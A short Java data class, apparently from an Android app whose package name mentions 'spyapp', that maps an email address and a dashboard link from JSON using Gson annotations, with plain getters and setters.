package kkactive_india.in.spyapp.mailPOJO;

import com.google.gson.annotations.Expose;
import com.google.gson.annotations.SerializedName;

public class Result {

    @SerializedName("email")
    @Expose
    private String email;
    @SerializedName("dashboardLink")
    @Expose
    private String dashboardLink;

    public String getEmail() {
        return email;
    }

    public void setEmail(String email) {
        this.email = email;
    }

    public String getDashboardLink() {
        return dashboardLink;
    }

    public void setDashboardLink(String dashboardLink) {
        this.dashboardLink = dashboardLink;
    }

}
